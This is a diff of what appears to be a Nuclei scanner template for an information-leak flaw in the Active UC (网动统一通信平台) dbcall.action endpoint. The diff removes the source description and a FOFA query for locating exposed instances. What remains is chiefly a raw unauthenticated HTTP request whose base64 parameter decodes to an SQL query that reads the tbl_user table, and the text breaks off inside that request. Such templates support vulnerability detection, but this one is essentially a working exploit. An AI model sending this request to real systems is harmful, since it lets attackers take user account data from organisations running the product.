@@ -3,12 +3,8 @@ info:
   name: 网动统一通信平台 dbcall.action存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zhgvx5fuysl7znxq'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zhgvx5fuysl7znxq
-    fofa: title="网动统一通信平台(Active UC)" || (body="top.action?params=index" && body="preLog.action")
 http:
 - raw:
   - 'GET /acenter/dbcall.action?cmdid=10018&verify_userid=dasd&verify_password=&verify_username=&verify_password_enc=&queryString=U0VMRUNUKkZST00vKiovdGJsX3VzZXIvKiovTElNSVQvKiovMCwx HTTP/1.1
